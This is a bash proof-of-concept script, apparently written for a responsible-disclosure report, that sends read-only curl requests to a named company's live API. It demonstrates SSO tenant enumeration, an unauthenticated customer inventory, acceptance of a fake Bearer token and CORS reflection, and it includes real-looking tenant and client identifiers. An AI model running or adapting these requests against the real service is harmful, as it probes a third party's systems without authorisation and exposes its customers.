#!/usr/bin/env bash
# ============================================================================
# sparelabs-poc.sh — Proof-of-Concept for report to security@sparelabs.com
# Reported: 2026-08-22 by Ritesh Ekbote <riteshekbote@gmail.com>
#
# What this script does:
#   Reproduces, step by step and read-only, the three unauthenticated issues
#   described in the accompanying email. No accounts, no writes, no customer
#   data access beyond what the API itself returns to anonymous callers.
#   Requests are spaced 1 second apart.
#
# Usage:
#   bash sparelabs-poc.sh > poc-output.txt   # then attach/print the output
# ============================================================================
set -u
API="https://api.sparelabs.com"
ORIGIN="https://attacker.example"
PASS=0; FAIL=0

hr(){ echo; echo "=================================================================="; echo "$1"; echo "=================================================================="; }
chk(){ if [ "$1" = "$2" ]; then echo "  [MATCH] expected $2"; PASS=$((PASS+1)); else echo "  [DIFF] got '$1' expected '$2' (endpoint may have been fixed — still evidence)"; FAIL=$((FAIL+1)); fi }

# ---------------------------------------------------------------------------
hr "FINDING 1 — WorkOS SSO tenant enumeration oracle (no authentication)"
echo "Step 1a: ask about a KNOWN SSO customer domain (spare.com)"
R=$(curl -s -w '\n%{http_code}' --max-time 15 -X POST -H "Content-Type: application/json" \
     -d '{"domain":"spare.com"}' "$API/v1/identity/workos/auth")
CODE=$(echo "$R"|tail -1); BODY=$(echo "$R"|head -1)
echo "  HTTP $CODE"; echo "  $BODY"
chk "$CODE" 200
echo "$BODY" | grep -q 'client_01F5KHYX32TCKB1E7YEAPE0H17' && echo "  [EVIDENCE] real WorkOS client_id disclosed pre-authentication"

echo "Step 1b: a second customer (winnipeg.ca) gets its OWN connection id"
R=$(curl -s --max-time 15 -X POST -H "Content-Type: application/json" \
     -d '{"domain":"winnipeg.ca"}' "$API/v1/identity/workos/auth")
echo "  $R"
echo "$R" | grep -q 'conn_01HP76PPV8CMRJH6RYRTWEPSGS' && echo "  [EVIDENCE] per-tenant connection identifier disclosed"
sleep 1

echo "Step 1c: negative control — non-customer domain returns 404 (= enumeration oracle)"
CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 -X POST \
     -H "Content-Type: application/json" \
     -d '{"domain":"not-a-spare-customer-xyz123.example"}' "$API/v1/identity/workos/auth")
echo "  HTTP $CODE"; chk "$CODE" 404
sleep 1

# ---------------------------------------------------------------------------
hr "FINDING 2 — Unauthenticated customer/tenant inventory oracle"
for K in winnipeg dallas hsr grt spare; do
  R=$(curl -s -w '\n%{http_code}' --max-time 15 -H "Origin: $ORIGIN" "$API/v1/public/organizations/key/$K")
  CODE=$(echo "$R"|tail -1); BODY=$(echo "$R"|head -1)
  NAME=$(echo "$BODY" | python3 -c "import json,sys
try: print(json.load(sys.stdin).get('name','?'))
except Exception: print('?')" 2>/dev/null)
  echo "key=$K -> HTTP $CODE | name: $NAME"
  [ "$CODE" = "200" ] && PASS=$((PASS+1)) || FAIL=$((FAIL+1))
  sleep 1
done
echo "Negative control:"
CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 -H "Origin: $ORIGIN" "$API/v1/public/organizations/key/not-a-real-key-xyz")
echo "  invalid key -> HTTP $CODE"; chk "$CODE" 404
echo "Same record also served by UUID path:"
curl -s --max-time 15 -H "Origin: $ORIGIN" \
  "https://api.sparelabs.com/v1/public/organizations/d736519f-f384-4771-a2d2-4f95e884d790" \
  | head -c 200; echo " ...[truncated]"
sleep 1

# ---------------------------------------------------------------------------
hr "FINDING 3 — Fake Bearer token accepted; internal/UAT topology returned"
echo "Step 3a: with garbage token 'Authorization: Bearer totally-fake-token'"
R=$(curl -s -w '\n%{http_code}' --max-time 15 -H "Origin: $ORIGIN" \
     -H "Authorization: Bearer totally-fake-token" "$API/v1/global/regions")
CODE=$(echo "$R"|tail -1); LEN=${#R}
echo "  HTTP $CODE (${LEN} bytes)"; chk "$CODE" 200
echo "  UAT environment present? $(echo "$R" | grep -q uat && echo YES || echo no)"
echo "Step 3b: control WITHOUT header -> should NOT be 200"
CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 -H "Origin: $ORIGIN" "$API/v1/global/regions")
echo "  HTTP $CODE"
sleep 1

# ---------------------------------------------------------------------------
hr "CONTEXT — CORS reflection + fail-open endpoint"
echo "C1: attacker Origin + Allow-Credentials reflected even on error responses:"
curl -s -I --max-time 15 -H "Origin: $ORIGIN" \
  "$API/v1/public/organizations/key/spare" | grep -iE 'HTTP/|access-control' 
echo "C2: GET /v1/global/organizations with NO credentials:"
curl -s --max-time 15 -H "Origin: $ORIGIN" "$API/v1/global/organizations" -w ' [%{http_code}]\n'

# ---------------------------------------------------------------------------
hr "SUMMARY"
echo "Checks matching reported behavior: $PASS ; divergent: $FAIL"
echo "(A divergence usually means the issue was fixed — thank you! Please reply"
echo " so we can mark the report resolved.)"
echo "End of proof-of-concept output. Generated: $(date -u '+%Y-%m-%d %H:%M UTC')"
